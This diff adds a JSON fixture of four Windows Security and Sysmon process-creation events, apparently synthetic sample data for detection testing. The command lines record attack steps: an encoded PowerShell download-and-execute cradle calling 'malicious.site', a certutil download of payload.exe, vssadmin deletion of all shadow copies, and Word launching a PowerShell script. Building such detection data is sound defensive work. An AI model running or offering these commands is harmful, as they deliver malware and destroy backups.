@@ -1,0 +1,45 @@
+[
+  {
+    "EventID": 4688,
+    "Channel": "Security",
+    "TimeCreated": "2026-10-04T10:15:30Z",
+    "Computer": "WORKSTATION-01.corp.internal",
+    "SubjectUserName": "jsmith",
+    "SubjectDomainName": "CORP",
+    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFcAIAAoAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHMAaQB0AGUALwBwAGEAeQBsAG8AYQBkACcAKQA=",
+    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "EventID": 1,
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "TimeCreated": "2026-10-04T10:18:12Z",
+    "Computer": "WORKSTATION-02.corp.internal",
+    "User": "CORP\\administrator",
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil.exe -urlcache -f http://10.0.4.15/payload.exe C:\\Users\\Public\\payload.exe",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "Hashes": "SHA256=A1B2C3D4E5F67890123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0"
+  },
+  {
+    "EventID": 4688,
+    "Channel": "Security",
+    "TimeCreated": "2026-10-04T10:22:45Z",
+    "Computer": "DC-01.corp.internal",
+    "SubjectUserName": "svc_backup",
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "EventID": 1,
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "TimeCreated": "2026-10-04T10:25:01Z",
+    "Computer": "WORKSTATION-03.corp.internal",
+    "User": "CORP\\victim_user",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c powershell -ExecutionPolicy Bypass -file payload.ps1",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+  }
+]
